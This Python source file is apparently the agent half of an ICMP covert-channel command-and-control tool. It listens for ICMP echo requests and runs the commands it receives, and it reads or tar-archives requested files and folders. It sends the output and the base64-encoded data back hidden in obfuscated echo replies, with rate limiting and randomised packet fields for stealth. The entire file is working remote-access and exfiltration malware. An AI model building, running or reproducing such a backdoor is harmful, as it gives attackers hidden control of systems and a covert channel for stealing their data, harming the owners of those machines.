#!/usr/bin/env python3
import os
import sys
import re
import time
import subprocess
import base64
import threading
from scapy.all import *
from scapy.layers.inet import IP, ICMP
from scapy.sendrecv import sniff, send
from scapy.layers.inet import Raw

# Import utility functions
sys.path.append(os.path.dirname(os.path.dirname(os.path.abspath(__file__))))
from core.utils import (
    get_default_interface, validate_ip, safe_path, validate_command, 
    create_directories, safe_file_write, obfuscate_payload, deobfuscate_payload,
    generate_icmp_id, generate_icmp_seq, RateLimiter, add_realistic_delay,
    calculate_optimal_packet_size, generate_session_id, should_send_beacon,
    get_stealth_config, cleanup_old_sessions, check_privileges
)

# Directories for temporary storage and output.
TEMP_DIR = "../data/sessions"
OUTPUT_DIR = "../data/outputs"
create_directories(TEMP_DIR, OUTPUT_DIR)

CHUNK_SIZE = 80  # Maximum payload length per ICMP packet
ICMP_FILTER = "icmp"
NETWORK_INTERFACE = get_default_interface()  # Auto-detect interface

# Stealth configuration
STEALTH_MODE = os.getenv('ICMP_STEALTH_MODE', 'normal')  # stealth, normal, aggressive
stealth_config = get_stealth_config()[STEALTH_MODE]

# Thread-local storage for session management to avoid race conditions
thread_local = threading.local()

# Rate limiter for stealth
rate_limiter = RateLimiter(
    max_packets_per_minute=stealth_config['max_packets_per_minute'],
    max_packets_per_hour=stealth_config['max_packets_per_hour']
)

# -------------------------
# Helper function to split response preserving lines.
# -------------------------
def split_response_preserve_lines(response, chunk_size):
    """
    Splits the response into chunks without breaking lines arbitrarily.
    Ensures that every line is preserved.
    If a single line is longer than chunk_size, it is split into smaller pieces.
    If adding a line exactly reaches chunk_size, the current chunk is flushed.
    """
    if not response:
        return [""]
    
    if not response.endswith("\n"):
        response += "\n"
    lines = response.splitlines(keepends=True)
    chunks = []
    current_chunk = ""
    
    for line in lines:
        if len(line) > chunk_size:
            if current_chunk:
                chunks.append(current_chunk)
                current_chunk = ""
            # Split long lines
            for i in range(0, len(line), chunk_size):
                chunks.append(line[i:i+chunk_size])
        else:
            if len(current_chunk) + len(line) > chunk_size:
                chunks.append(current_chunk)
                current_chunk = line
            elif len(current_chunk) + len(line) == chunk_size:
                current_chunk += line
                chunks.append(current_chunk)
                current_chunk = ""
            else:
                current_chunk += line
    
    if current_chunk:
        chunks.append(current_chunk)
    
    return chunks if chunks else [""]

# -------------------------
# Utility functions for chunk handling.
# -------------------------
def save_chunk(session_id, chunk_num, total_chunks, content):
    filename = os.path.join(TEMP_DIR, f"{session_id}_{chunk_num}.chunk")
    safe_file_write(filename, content)
    total_file = os.path.join(TEMP_DIR, f"{session_id}_total.txt")
    safe_file_write(total_file, str(total_chunks))
    print(f"Debug: Saved chunk {chunk_num}/{total_chunks} for session {session_id}")

def load_all_chunks(session_id, total_chunks):
    chunks = []
    for i in range(1, total_chunks + 1):
        filename = os.path.join(TEMP_DIR, f"{session_id}_{i}.chunk")
        if os.path.exists(filename):
            try:
                with open(filename, "r") as f:
                    chunks.append(f.read())
            except Exception as e:
                print(f"Error reading chunk {i}: {e}")
                return None
        else:
            return None
    return "".join(chunks)  # Consistent with server: no extra newlines

def cleanup_session(session_id):
    try:
        for filename in os.listdir(TEMP_DIR):
            if filename.startswith(session_id):
                os.remove(os.path.join(TEMP_DIR, filename))
        print(f"Debug: Cleaned up session {session_id}")
    except Exception as e:
        print(f"Error cleaning up session {session_id}: {e}")

def dynamic_sniff(filter, overall_timeout=60, idle_timeout=10):
    print("Debug: Starting dynamic sniffing...")
    start_time = time.time()
    last_packet_time = time.time()
    responses = []
    
    try:
        while time.time() - start_time < overall_timeout:
            new_pkts = sniff(filter=filter, timeout=5, count=1, iface=NETWORK_INTERFACE)
            if new_pkts:
                responses.extend(new_pkts)
                last_packet_time = time.time()
                print(f"Debug: Sniffed {len(new_pkts)} new packet(s)")
            else:
                if time.time() - last_packet_time >= idle_timeout:
                    print("Debug: Idle timeout reached during sniffing")
                    break
    except Exception as e:
        print(f"Error during sniffing: {e}")
    
    return responses

def send_icmp_response_stealth(target_ip, response, session_id=None):
    """
    Send ICMP response with stealth features (obfuscation and rate limiting)
    """
    try:
        if not validate_ip(target_ip):
            print(f"Invalid target IP: {target_ip}")
            return
        
        # Check rate limits
        if not rate_limiter.can_send_packet():
            wait_time = rate_limiter.get_wait_time()
            print(f"Rate limit reached. Waiting {wait_time:.2f} seconds...")
            time.sleep(wait_time)
        
        # Sanitize session_id to prevent regex issues
        if session_id:
            # Remove any special characters that could break regex
            safe_session_id = re.sub(r'[^\w\-]', '_', session_id)
        else:
            safe_session_id = None
        
        if len(response) <= CHUNK_SIZE:
            if safe_session_id:
                payload = f"[{safe_session_id}][1/1] {response}"
            else:
                payload = response
            
            # Obfuscate payload
            obfuscated_payload = obfuscate_payload(payload, stealth_config['obfuscation_level'])
            
            # Create ICMP packet with realistic parameters
            icmp_id = generate_icmp_id()
            icmp_seq = generate_icmp_seq()
            
            packet = IP(dst=target_ip) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=obfuscated_payload)
            send(packet, verbose=False)
            rate_limiter.record_packet_sent()
            
            print(f"Sent ICMP response to {target_ip}")
        else:
            chunks = split_response_preserve_lines(response, CHUNK_SIZE)
            total_chunks = len(chunks)
            
            print(f"Splitting response into {total_chunks} stealth ICMP packets.")
            for idx, chunk in enumerate(chunks):
                # Check rate limits for each chunk
                if not rate_limiter.can_send_packet():
                    wait_time = rate_limiter.get_wait_time()
                    print(f"Rate limit reached. Waiting {wait_time:.2f} seconds...")
                    time.sleep(wait_time)
                
                if safe_session_id:
                    payload = f"[{safe_session_id}][{idx+1}/{total_chunks}] {chunk}"
                else:
                    payload = f"[{idx+1}/{total_chunks}] {chunk}"
                
                # Obfuscate payload
                obfuscated_payload = obfuscate_payload(payload, stealth_config['obfuscation_level'])
                
                # Create ICMP packet with realistic parameters
                icmp_id = generate_icmp_id()
                icmp_seq = generate_icmp_seq()
                
                packet = IP(dst=target_ip) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=obfuscated_payload)
                send(packet, verbose=False)
                rate_limiter.record_packet_sent()
                
                print(f"Sent stealth chunk {idx+1}/{total_chunks} to {target_ip}")
                
                # Add realistic delays between packets
                add_realistic_delay()
                
    except Exception as e:
        print(f"Error: Error sending stealth ICMP response: {e}")

# -------------------------
# Command execution and GET functions.
# -------------------------
def execute_command(command):
    """
    Execute command with improved security and error handling
    """
    try:
        if not validate_command(command):
            return "Error: Command contains potentially dangerous operations or injection attempts"
        
        # Use list format to avoid shell injection
        import shlex
        args = shlex.split(command)
        if not args:
            return "Error: Empty command"
        
        output = subprocess.check_output(args, stderr=subprocess.STDOUT, timeout=30)
        return output.decode(errors="ignore").strip()
    except subprocess.TimeoutExpired:
        return "Error: Command timed out after 30 seconds"
    except subprocess.CalledProcessError as e:
        return f"Error: {e.output.decode(errors='ignore')}"
    except Exception as e:
        return f"Execution failed: {e}"

def get_file_or_folder(path):
    """
    Get file or folder with improved security and error handling
    """
    # Sanitize path and use the sanitized version consistently
    safe_path_name = safe_path(path)
    
    if os.path.isfile(safe_path_name):
        try:
            with open(safe_path_name, "rb") as f:
                data = f.read()
            encoded = base64.b64encode(data).decode()
            return f"FILE:{safe_path_name}\n{encoded}"
        except Exception as e:
            return f"Error reading file {safe_path_name}: {e}"
    elif os.path.isdir(safe_path_name):
        try:
            proc = subprocess.run(["tar", "czf", "-", safe_path_name],
                                  stdout=subprocess.PIPE, stderr=subprocess.PIPE, timeout=60)
            if proc.returncode != 0:
                return f"Error creating archive of directory {safe_path_name}: {proc.stderr.decode(errors='ignore')}"
            encoded = base64.b64encode(proc.stdout).decode()
            return f"FOLDER:{safe_path_name}\n{encoded}"
        except subprocess.TimeoutExpired:
            return f"Error: Archiving directory {safe_path_name} timed out"
        except Exception as e:
            return f"Error archiving directory {safe_path_name}: {e}"
    else:
        return f"Error: Path {safe_path_name} does not exist or is inaccessible."

def save_get_output(path, result):
    """
    Save GET output with improved security
    """
    try:
        safe_path_name = safe_path(path)
        
        if result.startswith("FILE:"):
            header, encoded = result.split("\n", 1)
            file_path = header[len("FILE:"):].strip()
            output_path = os.path.join(OUTPUT_DIR, safe_path(file_path))
            os.makedirs(os.path.dirname(output_path), exist_ok=True)
            data = base64.b64decode(encoded)
            with open(output_path, "wb") as f:
                f.write(data)
            print(f"Debug: Saved file output to {output_path}")
        elif result.startswith("FOLDER:"):
            header, encoded = result.split("\n", 1)
            folder_path = header[len("FOLDER:"):].strip()
            archive_path = os.path.join(OUTPUT_DIR, safe_path(folder_path) + ".tar.gz")
            os.makedirs(os.path.dirname(archive_path), exist_ok=True)
            data = base64.b64decode(encoded)
            with open(archive_path, "wb") as f:
                f.write(data)
            print(f"Debug: Saved folder archive to {archive_path}")
            extract_dir = os.path.join(OUTPUT_DIR, safe_path(folder_path))
            os.makedirs(extract_dir, exist_ok=True)
            subprocess.run(["tar", "xzf", archive_path, "-C", extract_dir])
            print(f"Debug: Extracted folder to {extract_dir}")
        else:
            safe_path_name = safe_path_name.replace("/", "_").strip("_")
            output_file = os.path.join(OUTPUT_DIR, f"{safe_path_name}_output.txt")
            safe_file_write(output_file, result)
            print(f"Debug: Saved text output to {output_file}")
    except Exception as e:
        print(f"Error: Error saving GET output: {e}")

# -------------------------
# ICMP Request Handler with Stealth Features
# -------------------------
def handle_icmp_request_stealth(pkt):
    """
    Handle ICMP requests with stealth features and payload deobfuscation
    """
    if pkt.haslayer(ICMP) and pkt[ICMP].type == 8:
        src_ip = pkt[IP].src
        
        # Validate source IP
        if not validate_ip(src_ip):
            print(f"Invalid source IP: {src_ip}")
            return
        
        if pkt.haslayer(Raw):
            try:
                raw_payload = pkt[Raw].load.decode(errors="ignore").strip()
                
                # Try to deobfuscate payload at different levels
                payload = None
                for level in [3, 2, 1]:  # Try high to low obfuscation levels
                    try:
                        deobfuscated = deobfuscate_payload(raw_payload, level)
                        if deobfuscated != raw_payload:
                            payload = deobfuscated
                            print(f"Debug: Deobfuscated payload (level {level}) from {src_ip}")
                            break
                    except Exception:
                        continue
                
                # If no deobfuscation worked, use original payload
                if payload is None:
                    payload = raw_payload
                
                print(f"Debug: Processed payload from {src_ip}: {repr(payload)}")
                payload_upper = payload.upper()
                
                if payload_upper.startswith("CMD:GET:") or payload_upper.startswith("GET:"):
                    if payload_upper.startswith("CMD:GET:"):
                        rest = payload[8:].strip()
                    else:
                        rest = payload[4:].strip()
                    parts = re.split(r'\s+SESSION:', rest, flags=re.IGNORECASE)
                    path = parts[0].strip()
                    session = parts[1].strip() if len(parts) > 1 else None
                    print(f"Received GET request from {src_ip} for path: {path} with session: {session}")
                    result = get_file_or_folder(path)
                    print(f"Retrieved file/folder: {path} | Data length: {len(result)}")
                    if session:
                        result = f"SESSION:{session}\n{result}"
                    save_get_output(path, result)
                    send_icmp_response_stealth(src_ip, result, session)
                    
                elif payload_upper.startswith("CMD:TASK:"):
                    inner = payload[len("CMD:TASK:"):].strip()
                    if inner.upper().startswith("GET:"):
                        rest = inner[4:].strip()
                        parts = re.split(r'\s+SESSION:', rest, flags=re.IGNORECASE)
                        path = parts[0].strip()
                        session = parts[1].strip() if len(parts) > 1 else None
                        print(f"Received GET request (embedded in TASK) from {src_ip} for path: {path} with session: {session}")
                        result = get_file_or_folder(path)
                        print(f"Retrieved file/folder: {path} | Data length: {len(result)}")
                        if session:
                            result = f"SESSION:{session}\n{result}"
                        save_get_output(path, result)
                        send_icmp_response_stealth(src_ip, result, session)
                    else:
                        session = None
                        if "SESSION:" in inner.upper():
                            parts = re.split(r'\s+SESSION:', inner, flags=re.IGNORECASE)
                            command = parts[0].strip()
                            session = parts[1].strip() if len(parts) > 1 else None
                        else:
                            command = inner
                        print(f"Received TASK command from {src_ip}: {command} with session: {session}")
                        result = execute_command(command)
                        print(f"Executed: {command} | Output: {result}")
                        output_file = os.path.join(OUTPUT_DIR, f"{session}_cmd_output.txt" if session else "cmd_output.txt")
                        safe_file_write(output_file, result)
                        if session:
                            result = f"SESSION:{session}\n{result}"
                        send_icmp_response_stealth(src_ip, result, session)
                        
                elif payload.startswith("RESEND:"):
                    missing_str = payload[len("RESEND:"):].strip()
                    missing_chunks = [int(x.strip()) for x in missing_str.split(",") if x.strip().isdigit()]
                    print(f"Received RESEND request from {src_ip} for chunks: {missing_chunks}")
                    
                    # Extract session ID from the request if present
                    session_id = None
                    if "SESSION:" in payload:
                        session_match = re.search(r'SESSION:(\S+)', payload)
                        if session_match:
                            session_id = session_match.group(1)
                    
                    if session_id:
                        # Load chunks from file system instead of thread-local storage
                        total_file = os.path.join(TEMP_DIR, f"{session_id}_total.txt")
                        if os.path.exists(total_file):
                            try:
                                with open(total_file, "r") as f:
                                    total_chunks = int(f.read().strip())
                                
                                for num in missing_chunks:
                                    if 1 <= num <= total_chunks:
                                        chunk_file = os.path.join(TEMP_DIR, f"{session_id}_{num}.chunk")
                                        if os.path.exists(chunk_file):
                                            with open(chunk_file, "r") as f:
                                                chunk = f.read()
                                            
                                            # Sanitize session_id for payload
                                            safe_session_id = re.sub(r'[^\w\-]', '_', session_id)
                                            resend_payload = f"[{safe_session_id}][{num}/{total_chunks}] {chunk}"
                                            
                                            # Obfuscate and send with stealth
                                            obfuscated_payload = obfuscate_payload(resend_payload, stealth_config['obfuscation_level'])
                                            icmp_id = generate_icmp_id()
                                            icmp_seq = generate_icmp_seq()
                                            
                                            packet = IP(dst=src_ip) / ICMP(type=0, id=icmp_id, seq=icmp_seq) / Raw(load=obfuscated_payload)
                                            send(packet, verbose=False)
                                            rate_limiter.record_packet_sent()
                                            
                                            print(f"Resent stealth chunk {num}/{total_chunks} to {src_ip}")
                                            add_realistic_delay()
                                        else:
                                            print(f"Chunk file {chunk_file} not found")
                                    else:
                                        print(f"Requested chunk {num} exceeds total {total_chunks}")
                            except Exception as e:
                                print(f"Error processing resend request: {e}")
                        else:
                            print(f"Total chunks file not found for session {session_id}")
                    else:
                        print("No session ID found in resend request")
                        
                else:
                    print(f"Unrecognized payload from {src_ip}: {payload}")
            except Exception as e:
                print(f"Error: Error processing ICMP packet: {e}")

def start_icmp_listener_stealth():
    """
    Start ICMP listener with stealth features
    """
    print(f"Starting ICMP Agent with stealth mode: {STEALTH_MODE}")
    print(f"Listening on interface: {NETWORK_INTERFACE}")
    print(f"Stealth config: {stealth_config}")
    
    # Check privileges
    if not check_privileges():
        print(f"Warning: Running without root privileges. Packet sniffing may not work properly.")
        print("Consider running with sudo for full functionality.")
    
    # Clean up old sessions on startup
    cleanup_old_sessions(TEMP_DIR)
    
    try:
        sniff(filter=ICMP_FILTER, iface=NETWORK_INTERFACE, prn=handle_icmp_request_stealth, store=False)
    except Exception as e:
        print(f"Error starting ICMP listener: {e}")
        print(f"Trying alternative interface detection...")
        # Try without specifying interface
        try:
            sniff(filter=ICMP_FILTER, prn=handle_icmp_request_stealth, store=False)
        except Exception as e2:
            print(f"Failed to start listener: {e2}")
            sys.exit(1)

if __name__ == "__main__":
    start_icmp_listener_stealth()
